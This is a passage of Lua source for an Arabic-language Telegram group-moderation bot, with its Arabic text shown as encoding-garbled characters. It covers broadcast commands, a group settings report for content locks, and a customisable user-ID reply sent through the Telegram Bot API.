if text=="Ψ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ" and msg.reply_to_message_id_ == 0 and DevBot(msg) then 
if database:get(bot_id.."Status:Bc") and not DevSonic(msg) then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΨΉΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false
end
database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ±Ψ³Ω ΩΩ Ψ³ΩΨ§Ψ‘ ~ { ΩΩΨ΅Ω, ΩΨͺΨ­Ψ±ΩΩ, Ψ΅ΩΨ±Ω, Ψ±Ψ³Ψ§ΩΩ }\nΩ­ ΩΩΨ?Ψ±ΩΨ¬ Ψ§Ψ±Ψ³Ω Ψ§ΩΨΊΨ§Ψ‘ ") 
return false
end 
if text=="Ψ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ" and msg.reply_to_message_id_ == 0 and DevBot(msg) then 
if database:get(bot_id.."Status:Bc") and not DevSonic(msg) then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΨΉΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false
end
database:setex(bot_id.."Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ Ψ§ΩΨ§Ω") 
return false
end 
if text=="Ψ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ Ψ?Ψ§Ψ΅" and msg.reply_to_message_id_ == 0 and DevBot(msg) then 
if database:get(bot_id.."Status:Bc") and not DevSonic(msg) then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΨΉΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false
end
database:setex(bot_id.."Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ Ψ§ΩΨ§Ω") 
return false
end 

if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ" and DevSonic(msg) then 
database:del(bot_id.."Status:Bc") 
send(msg.chat_id_, msg.id_,"\nΩ­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ " ) 
return false
end 
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ" and DevSonic(msg) then 
database:set(bot_id.."Status:Bc",true) 
send(msg.chat_id_, msg.id_,"\nΩ­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ") 
return false
end 

if text == "Ψ§ΩΨ§ΨΉΨ―Ψ§Ψ―Ψ§Ψͺ" and Admin(msg) then 
if database:get(bot_id.."lockpin"..msg.chat_id_) then 
lock_pin = "β"
else 
lock_pin = "β" 
end
if database:get(bot_id.."Lock:tagservr"..msg.chat_id_) then 
lock_tagservr = "β"
else 
lock_tagservr = "β" 
end
if database:get(bot_id.."Lock:text"..msg.chat_id_) then 
lock_text = "β"
else 
lock_text = "β" 
end
if database:get(bot_id.."Lock:AddMempar"..msg.chat_id_) == "kick" then
lock_add = "β"
else 
lock_add = "β" 
end 
if database:get(bot_id.."Lock:Join"..msg.chat_id_) == "kick" then
lock_join = "β"
else 
lock_join = "β" 
end 
if database:get(bot_id.."Lock:edit"..msg.chat_id_) then 
lock_edit = "β"
else 
lock_edit = "β" 
end
if database:get(bot_id.."Get:Welcome:Group"..msg.chat_id_) then
welcome = "β"
else 
welcome = "β" 
end
if database:hget(bot_id.."flooding:settings:"..msg.chat_id_, "flood") == "kick" then 
flood = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―" 
elseif database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") == "keed" then 
flood = "Ψ¨Ψ§ΩΨͺΩΩΩΨ―" 
elseif database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") == "mute" then 
flood = "Ψ¨Ψ§ΩΩΨͺΩ" 
elseif database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") == "del" then 
flood = "Ψ¨Ψ§ΩΩΨ³Ψ­" 
else 
flood = "β" 
end
if database:get(bot_id.."Lock:Photo"..msg.chat_id_) == "del" then
lock_photo = "β" 
elseif database:get(bot_id.."Lock:Photo"..msg.chat_id_) == "ked" then 
lock_photo = "Ψ¨Ψ§ΩΨͺΩΩΩΨ―" 
elseif database:get(bot_id.."Lock:Photo"..msg.chat_id_) == "ktm" then 
lock_photo = "Ψ¨Ψ§ΩΩΨͺΩ" 
elseif database:get(bot_id.."Lock:Photo"..msg.chat_id_) == "kick" then 
lock_photo = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―" 
else
lock_photo = "β" 
end 
if database:get(bot_id.."Lock:Contact"..msg.chat_id_) == "del" then
lock_phon = "β" 
elseif database:get(bot_id.."Lock:Contact"..msg.chat_id_) == "ked" then 
lock_phon = "Ψ¨Ψ§ΩΨͺΩΩΩΨ―" 
elseif database:get(bot_id.."Lock:Contact"..msg.chat_id_) == "ktm" then 
lock_phon = "Ψ¨Ψ§ΩΩΨͺΩ" 
elseif database:get(bot_id.."Lock:Contact"..msg.chat_id_) == "kick" then 
lock_phon = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―" 
else
lock_phon = "β" 
end 
if database:get(bot_id.."Lock:Link"..msg.chat_id_) == "del" then
lock_links = "β"
elseif database:get(bot_id.."Lock:Link"..msg.chat_id_) == "ked" then
lock_links = "Ψ¨Ψ§ΩΨͺΩΩΩΨ―" 
elseif database:get(bot_id.."Lock:Link"..msg.chat_id_) == "ktm" then
lock_links = "Ψ¨Ψ§ΩΩΨͺΩ" 
elseif database:get(bot_id.."Lock:Link"..msg.chat_id_) == "kick" then
lock_links = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―" 
else
lock_links = "β" 
end
if database:get(bot_id.."Lock:Cmd"..msg.chat_id_) == "del" then
lock_cmds = "β"
elseif database:get(bot_id.."Lock:Cmd"..msg.chat_id_) == "ked" then
lock_cmds = "Ψ¨Ψ§ΩΨͺΩΩΩΨ―" 
elseif database:get(bot_id.."Lock:Cmd"..msg.chat_id_) == "ktm" then
lock_cmds = "Ψ¨Ψ§ΩΩΨͺΩ" 
elseif database:get(bot_id.."Lock:Cmd"..msg.chat_id_) == "kick" then
lock_cmds = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―" 
else
lock_cmds = "β" 
end
if database:get(bot_id.."Lock:User:Name"..msg.chat_id_) == "del" then
lock_user = "β"
elseif database:get(bot_id.."Lock:User:Name"..msg.chat_id_) == "ked" then
lock_user = "Ψ¨Ψ§ΩΨͺΩΩΩΨ―" 
elseif database:get(bot_id.."Lock:User:Name"..msg.chat_id_) == "ktm" then
lock_user = "Ψ¨Ψ§ΩΩΨͺΩ" 
elseif database:get(bot_id.."Lock:User:Name"..msg.chat_id_) == "kick" then
lock_user = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―" 
else
lock_user = "β" 
end
if database:get(bot_id.."Lock:hashtak"..msg.chat_id_) == "del" then
lock_hash = "β"
elseif database:get(bot_id.."Lock:hashtak"..msg.chat_id_) == "ked" then 
lock_hash = "Ψ¨Ψ§ΩΨͺΩΩΩΨ―" 
elseif database:get(bot_id.."Lock:hashtak"..msg.chat_id_) == "ktm" then 
lock_hash = "Ψ¨Ψ§ΩΩΨͺΩ" 
elseif database:get(bot_id.."Lock:hashtak"..msg.chat_id_) == "kick" then 
lock_hash = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―" 
else
lock_hash = "β" 
end
if database:get(bot_id.."Lock:vico"..msg.chat_id_) == "del" then
lock_muse = "β"
elseif database:get(bot_id.."Lock:vico"..msg.chat_id_) == "ked" then 
lock_muse = "Ψ¨Ψ§ΩΨͺΩΩΩΨ―" 
elseif database:get(bot_id.."Lock:vico"..msg.chat_id_) == "ktm" then 
lock_muse = "Ψ¨Ψ§ΩΩΨͺΩ" 
elseif database:get(bot_id.."Lock:vico"..msg.chat_id_) == "kick" then 
lock_muse = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―" 
else
lock_muse = "β" 
end 
if database:get(bot_id.."Lock:Video"..msg.chat_id_) == "del" then
lock_ved = "β"
elseif database:get(bot_id.."Lock:Video"..msg.chat_id_) == "ked" then 
lock_ved = "Ψ¨Ψ§ΩΨͺΩΩΩΨ―" 
elseif database:get(bot_id.."Lock:Video"..msg.chat_id_) == "ktm" then 
lock_ved = "Ψ¨Ψ§ΩΩΨͺΩ" 
elseif database:get(bot_id.."Lock:Video"..msg.chat_id_) == "kick" then 
lock_ved = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―" 
else
lock_ved = "β" 
end
if database:get(bot_id.."Lock:Animation"..msg.chat_id_) == "del" then
lock_gif = "β"
elseif database:get(bot_id.."Lock:Animation"..msg.chat_id_) == "ked" then 
lock_gif = "Ψ¨Ψ§ΩΨͺΩΩΩΨ―" 
elseif database:get(bot_id.."Lock:Animation"..msg.chat_id_) == "ktm" then 
lock_gif = "Ψ¨Ψ§ΩΩΨͺΩ" 
elseif database:get(bot_id.."Lock:Animation"..msg.chat_id_) == "kick" then 
lock_gif = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―" 
else
lock_gif = "β" 
end
if database:get(bot_id.."Lock:Sticker"..msg.chat_id_) == "del" then
lock_ste = "β"
elseif database:get(bot_id.."Lock:Sticker"..msg.chat_id_) == "ked" then 
lock_ste = "Ψ¨Ψ§ΩΨͺΩΩΩΨ― " 
elseif database:get(bot_id.."Lock:Sticker"..msg.chat_id_) == "ktm" then 
lock_ste = "Ψ¨Ψ§ΩΩΨͺΩ " 
elseif database:get(bot_id.."Lock:Sticker"..msg.chat_id_) == "kick" then 
lock_ste = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―" 
else
lock_ste = "β" 
end
if database:get(bot_id.."Lock:geam"..msg.chat_id_) == "del" then
lock_geam = "β"
elseif database:get(bot_id.."Lock:geam"..msg.chat_id_) == "ked" then 
lock_geam = "Ψ¨Ψ§ΩΨͺΩΩΩΨ―" 
elseif database:get(bot_id.."Lock:geam"..msg.chat_id_) == "ktm" then 
lock_geam = "Ψ¨Ψ§ΩΩΨͺΩ" 
elseif database:get(bot_id.."Lock:geam"..msg.chat_id_) == "kick" then 
lock_geam = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―" 
else
lock_geam = "β" 
end 
if database:get(bot_id.."Lock:vico"..msg.chat_id_) == "del" then
lock_vico = "β"
elseif database:get(bot_id.."Lock:vico"..msg.chat_id_) == "ked" then 
lock_vico = "Ψ¨Ψ§ΩΨͺΩΩΩΨ―" 
elseif database:get(bot_id.."Lock:vico"..msg.chat_id_) == "ktm" then 
lock_vico = "Ψ¨Ψ§ΩΩΨͺΩ" 
elseif database:get(bot_id.."Lock:vico"..msg.chat_id_) == "kick" then 
lock_vico = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―" 
else
lock_vico = "β" 
end 
if database:get(bot_id.."Lock:Keyboard"..msg.chat_id_) == "del" then
lock_inlin = "β"
elseif database:get(bot_id.."Lock:Keyboard"..msg.chat_id_) == "ked" then 
lock_inlin = "Ψ¨Ψ§ΩΨͺΩΩΩΨ―"
elseif database:get(bot_id.."Lock:Keyboard"..msg.chat_id_) == "ktm" then 
lock_inlin = "Ψ¨Ψ§ΩΩΨͺΩ" 
elseif database:get(bot_id.."Lock:Keyboard"..msg.chat_id_) == "kick" then 
lock_inlin = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―"
else
lock_inlin = "β"
end
if database:get(bot_id.."Lock:forward"..msg.chat_id_) == "del" then
lock_fwd = "β"
elseif database:get(bot_id.."Lock:forward"..msg.chat_id_) == "ked" then 
lock_fwd = "Ψ¨Ψ§ΩΨͺΩΩΩΨ―" 
elseif database:get(bot_id.."Lock:forward"..msg.chat_id_) == "ktm" then 
lock_fwd = "Ψ¨Ψ§ΩΩΨͺΩ" 
elseif database:get(bot_id.."Lock:forward"..msg.chat_id_) == "kick" then 
lock_fwd = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―" 
else
lock_fwd = "β" 
end 
if database:get(bot_id.."Lock:Document"..msg.chat_id_) == "del" then
lock_file = "β"
elseif database:get(bot_id.."Lock:Document"..msg.chat_id_) == "ked" then 
lock_file = "Ψ¨Ψ§ΩΨͺΩΩΩΨ―" 
elseif database:get(bot_id.."Lock:Document"..msg.chat_id_) == "ktm" then 
lock_file = "Ψ¨Ψ§ΩΩΨͺΩ" 
elseif database:get(bot_id.."Lock:Document"..msg.chat_id_) == "kick" then 
lock_file = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―" 
else
lock_file = "β" 
end 
if database:get(bot_id.."Lock:Unsupported"..msg.chat_id_) == "del" then
lock_self = "β"
elseif database:get(bot_id.."Lock:Unsupported"..msg.chat_id_) == "ked" then 
lock_self = "Ψ¨Ψ§ΩΨͺΩΩΩΨ―" 
elseif database:get(bot_id.."Lock:Unsupported"..msg.chat_id_) == "ktm" then 
lock_self = "Ψ¨Ψ§ΩΩΨͺΩ" 
elseif database:get(bot_id.."Lock:Unsupported"..msg.chat_id_) == "kick" then 
lock_self = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―" 
else
lock_self = "β" 
end
if database:get(bot_id.."Lock:Bot:kick"..msg.chat_id_) == "del" then
lock_bots = "β"
elseif database:get(bot_id.."Lock:Bot:kick"..msg.chat_id_) == "ked" then
lock_bots = "Ψ¨Ψ§ΩΨͺΩΩΩΨ―" 
elseif database:get(bot_id.."Lock:Bot:kick"..msg.chat_id_) == "kick" then
lock_bots = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―" 
else
lock_bots = "β" 
end
if database:get(bot_id.."Lock:Markdaun"..msg.chat_id_) == "del" then
lock_mark = "β"
elseif database:get(bot_id.."Lock:Markdaun"..msg.chat_id_) == "ked" then 
lock_mark = "Ψ¨Ψ§ΩΨͺΩΩΩΨ―" 
elseif database:get(bot_id.."Lock:Markdaun"..msg.chat_id_) == "ktm" then 
lock_mark = "Ψ¨Ψ§ΩΩΨͺΩ" 
elseif database:get(bot_id.."Lock:Markdaun"..msg.chat_id_) == "kick" then 
lock_mark = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―" 
else
lock_mark = "β" 
end
if database:get(bot_id.."Lock:Spam"..msg.chat_id_) == "del" then 
lock_spam = "β"
elseif database:get(bot_id.."Lock:Spam"..msg.chat_id_) == "ked" then 
lock_spam = "Ψ¨Ψ§ΩΨͺΩΩΩΨ―" 
elseif database:get(bot_id.."Lock:Spam"..msg.chat_id_) == "ktm" then 
lock_spam = "Ψ¨Ψ§ΩΩΨͺΩ" 
elseif database:get(bot_id.."Lock:Spam"..msg.chat_id_) == "kick" then 
lock_spam = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―" 
else
lock_spam = "β" 
end 
if not database:get(bot_id.."Reply:Manager"..msg.chat_id_) then
rdmder = "β"
else
rdmder = "β"
end
if not database:get(bot_id.."Reply:Sudo"..msg.chat_id_) then
rdsudo = "β"
else
rdsudo = "β"
end
if not database:get(bot_id.."Lock:ID:Bot"..msg.chat_id_) then
idgp = "β"
else
idgp = "β"
end
if not database:get(bot_id.."Lock:ID:Bot:Photo"..msg.chat_id_) then
idph = "β"
else
idph = "β"
end
if not database:get(bot_id.."Lock:kick"..msg.chat_id_) then
setadd = "β"
else
setadd = "β"
end
if not database:get(bot_id.."Lock:Add:Bot"..msg.chat_id_) then
banm = "β"
else
banm = "β"
end
if not database:get(bot_id.."Kick:Me"..msg.chat_id_) then
kickme = "β"
else
kickme = "β"
end
Num_Flood = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 0
local text = 
"*\nΩ­ Ψ§Ψ§ΨΉΨ―Ψ§Ψ―Ψ§Ψͺ Ψ§ΩΩΨ¬ΩΩΨΉΩ "..
"\nβ β β β β β β β β "..
"\nπβΨΉΩΨ§ΩΨ© Ψ§Ω {β} ΨͺΨΉΩΩ ΩΩΨΉΩ"..
"\nπβΨΉΩΨ§ΩΨ© Ψ§Ω {β} ΨͺΨΉΩΩ ΩΨΉΨ·Ω"..
"\nβ β β β β β β β β "..
"\nΩ­ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ· Β» "..lock_links..
"\n".."Ω­ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ Β» "..lock_user..
"\n".."Ω­ Ψ§ΩΨͺΨ§Ω Β» "..lock_hash..
"\n".."Ω­ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ Β» "..lock_bots..
"\n".."Ω­ Ψ§ΩΨͺΩΨ¬ΩΩ Β» "..lock_fwd..
"\n".."Ω­ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ Β» "..lock_pin..
"\n".."Ω­ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ Β» "..lock_tagservr..
"\n".."Ω­ Ψ§ΩΩΨ§Ψ±ΩΨ―ΩΩ Β» "..lock_mark..
"\n".."Ω­ Ψ§ΩΨͺΨΉΨ―ΩΩ Β» "..lock_edit..
"\nβ β β β β β β β β "..
"\n".."Ω­ Ψ§ΩΩΩΨ§ΩΨ΄ Β» "..lock_spam..
"\n".."Ω­ Ψ§ΩΩΩΨ¨ΩΨ±Ψ― Β» "..lock_inlin..
"\n".."Ω­ Ψ§ΩΨ§ΨΊΨ§ΩΩ Β» "..lock_vico..
"\n".."Ω­ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ Β» "..lock_gif..
"\n".."Ω­ Ψ§ΩΩΩΩΨ§Ψͺ Β» "..lock_file..
"\n".."Ω­ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω Β» "..lock_text..
"\n".."Ω­ Ψ§ΩΩΩΨ―ΩΩ Β» "..lock_ved..
"\n".."Ω­ Ψ§ΩΨ΅ΩΨ± Β» "..lock_photo..
"\nβ β β β β β β β β "..
"\n".."Ω­ Ψ§ΩΨ΅ΩΨͺ Β» "..lock_muse..
"\n".."Ω­ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ Β» "..lock_ste..
"\n".."Ω­ Ψ§ΩΨ¬ΩΨ§Ψͺ Β» "..lock_phon..
"\n".."Ω­ Ψ§ΩΨ―Ψ?ΩΩ Β» "..lock_join..
"\n".."Ω­ Ψ§ΩΨ§ΨΆΨ§ΩΩ Β» "..lock_add..
"\n".."Ω­ Ψ§ΩΨ³ΩΩΩΩ Β» "..lock_self..
"\n".."Ω­ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨ Β» "..lock_geam..
"\n".."Ω­ Ψ§ΩΨͺΩΨ±Ψ§Ψ± Β» "..flood..
"\n".."Ω­ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨ Β» "..welcome..
"\n".."Ω­ ΨΉΨ―Ψ― Ψ§ΩΨͺΩΨ±Ψ§Ψ± Β» "..Num_Flood..
"\n\n.*"
send(msg.chat_id_, msg.id_,text) 
end 
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨ­Ψ΄ΩΨ΄" and Manger(msg) then 
send(msg.chat_id_, msg.id_, 'Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨ­Ψ΄ΩΨ΄')
database:set(bot_id.."Fun_Bots"..msg.chat_id_,"true")
end
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨ­Ψ΄ΩΨ΄" and Manger(msg) then 
send(msg.chat_id_, msg.id_,'Ω­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨ­Ψ΄ΩΨ΄')
database:del(bot_id.."Fun_Bots"..msg.chat_id_)
end

if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω' and Manger(msg) then 
database:del(bot_id..'Lock:ID:Bot'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,'Ω­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω') 
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω' and Manger(msg) then 
database:set(bot_id..'Lock:ID:Bot'..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,'Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω') 
end
if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω' and Manger(msg) then 
database:del(bot_id..'Lock:ID:Bot:Photo'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,'Ω­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω') 
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω' and Manger(msg) then 
database:set(bot_id..'Lock:ID:Bot:Photo'..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,'Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω') 
end

if text == 'ΨͺΨΉΩΩΩ Ψ§ΩΨ§ΩΨ―Ω' and Manger(msg) then
database:setex(bot_id.."Set:Id:Gp"..msg.chat_id_..""..msg.sender_user_id_,240,true) 
local Text= [[
Ω­ Ψ§Ψ±Ψ³Ω Ψ§ΩΨ§Ω Ψ§ΩΩΨ΅
Ω­ ΩΩΩΩΩ Ψ§ΨΆΨ§ΩΩ :
- `#username` > Ψ§Ψ³Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω
- `#msgs` > ΨΉΨ―Ψ― Ψ±Ψ³Ψ§Ψ¦Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω
- `#photos` > ΨΉΨ―Ψ― Ψ΅ΩΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω
- `#id` > Ψ§ΩΨ―Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω
- `#auto` > ΨͺΩΨ§ΨΉΩ Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω
- `#stast` > ΩΩΩΨΉ Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω 
- `#edit` > ΨΉΨ―Ψ― Ψ§ΩΨͺΨΉΨ―ΩΩΨ§Ψͺ
- `#game` > Ψ§ΩΩΩΨ§Ψ·
- `#AddMem` > ΨΉΨ―Ψ― Ψ§ΩΨ¬ΩΨ§Ψͺ
- `#Description` > ΨͺΨΉΩΩΩ Ψ§ΩΨ΅ΩΨ±Ω
]]
send(msg.chat_id_, msg.id_,Text)
return false 
end 
if text == 'Ψ­Ψ°Ω Ψ§ΩΨ§ΩΨ―Ω' or text == 'ΩΨ³Ψ­ Ψ§ΩΨ§ΩΨ―Ω' then
if Manger(msg) then
database:del(bot_id.."Klesh:Id:Bot"..msg.chat_id_)
send(msg.chat_id_, msg.id_, 'Ω­ ΨͺΩ Ψ§Ψ²Ψ§ΩΨ© ΩΩΩΨ΄Ψ© Ψ§ΩΨ§ΩΨ―Ω ')
end
return false 
end 

if database:get(bot_id.."Set:Id:Gp"..msg.chat_id_..""..msg.sender_user_id_) then 
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΨΉΩΩΩ Ψ§ΩΨ§ΩΨ―Ω") 
database:del(bot_id.."Set:Id:Gp"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end 
database:del(bot_id.."Set:Id:Gp"..msg.chat_id_..""..msg.sender_user_id_) 
database:set(bot_id.."Klesh:Id:Bot"..msg.chat_id_,text:match("(.*)"))
send(msg.chat_id_, msg.id_,'Ω­ ΨͺΩ ΨͺΨΉΩΩΩ Ψ§ΩΨ§ΩΨ―Ω') 
end

if text == 'Ψ§ΩΨ―Ω' and tonumber(msg.reply_to_message_id_) == 0 and not database:get(bot_id..'Lock:ID:Bot'..msg.chat_id_) then
if not database:sismember(bot_id..'Spam:Group'..msg.sender_user_id_,text) then
database:sadd(bot_id.."Spam:Group"..msg.sender_user_id_,text) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = msg.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,mahmoud,success) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,deata) 
if deata.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'ΩΩΨ΄Ψ¦'
elseif deata.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'Ψ§Ψ―ΩΩ' 
elseif deata.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'ΨΉΨΆΩ'
end

if deata.join_date_ ~= 0 then
tarek = os.date('%Y-%m-%d', deata.join_date_)
else
tarek = 'ΩΨ§ ΩΩΨ¬Ψ― ' 
end
if data.username_ then
UserName_User = '@'..data.username_
else
UserName_User = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
local Ctitle = json:decode(https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_))
if Ctitle.result.status == "administrator" and Ctitle.result.custom_title or Ctitle.result.status == "creator" and Ctitle.result.custom_title then
lakbk = Ctitle.result.custom_title
else
lakbk = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
local Id = msg.sender_user_id_
local NumMsg = database:get(bot_id..'messageUser'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = database:get(bot_id.."Comd:New:rt:User:"..msg.chat_id_..Id) or Get_Rank(Id,msg.chat_id_)
local message_edit = database:get(bot_id..'message_edit'..msg.chat_id_..msg.sender_user_id_) or 0
local Num_Games = database:get(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_) or 0
local Add_Mem = database:get(bot_id.."Add:Memp"..msg.chat_id_..":"..msg.sender_user_id_) or 0
local Total_Photp = (mahmoud.total_count_ or 0)
local Texting = {
".",
}
local Description = Texting[math.random(#Texting)]
local get_id = database:get(bot_id.."Klesh:Id:Bot"..msg.chat_id_) or database:get(bot_id.."KleshIDALLBOT")
if not database:get(bot_id..'Lock:ID:Bot:Photo'..msg.chat_id_) then
if mahmoud.photos_[0] then
if get_id then
local get_id = get_id:gsub('#AddMem',Add_Mem) 
local get_id = get_id:gsub('#id',Id) 
local get_id = get_id:gsub('#username',UserName_User) 
local get_id = get_id:gsub('#msgs',NumMsg) 
local get_id = get_id:gsub('#edit',message_edit) 
local get_id = get_id:gsub('#stast',Status_Gps) 
local get_id = get_id:gsub('#auto',TotalMsg) 
local get_id = get_id:gsub('#Description',Description) 
local get_id = get_id:gsub('#game',Num_Games) 
local get_id = get_id:gsub('#photos',Total_Photp) 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(get_id)..'&photo='..mahmoud.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id) 
else
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'en', callback_data=msg.sender_user_id_.."/ideengphoto"},{text = 'ar', callback_data=msg.sender_user_id_.."/idearpphoto"},
},
}
local msg_id = msg.id_/2097152/0.5
local texte = '\nβ― Ψ§ΩΨ§ΩΨ―Ω β― '..Id..'\nβ― ΩΨΉΨ±ΩΩ β― '..UserName_User..'\nβ― Ψ±ΨͺΨ¨ΨͺΩ β― '..Status_Gps..'\nβ― Ψ±Ψ³Ψ§Ψ¦ΩΩ β― '..NumMsg..' \nβ― ΨͺΩΨ§ΨΉΩΩ β― '..TotalMsg..'\nβ― ΩΩΨ¨Ω β― '..lakbk..'\nβ― Ψ§ΩΨ¨Ψ§ΩΩ β― '..getbio(Id)
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(texte)..'&photo='..mahmoud.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
else
